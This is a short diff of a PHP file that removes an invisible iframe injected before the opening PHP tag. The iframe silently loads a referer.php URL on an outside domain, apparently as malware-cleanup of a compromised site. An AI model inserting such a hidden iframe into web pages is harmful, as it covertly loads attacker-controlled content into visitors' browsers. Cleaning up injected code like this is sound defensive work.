@@ -1,4 +1,4 @@
-﻿<iframe style="visibility: hidden; display: none; display: none;" src="http://used-toyota-cars.co.uk/referer.php?id={0CB7C8EA-2C9F-4119-AA6A-6CF2ADC392BA}"></iframe>﻿<?php
+﻿<?php
 session_start();
 $ur_session = rand(0, 15);
 $_SESSION['session']=$ur_session;
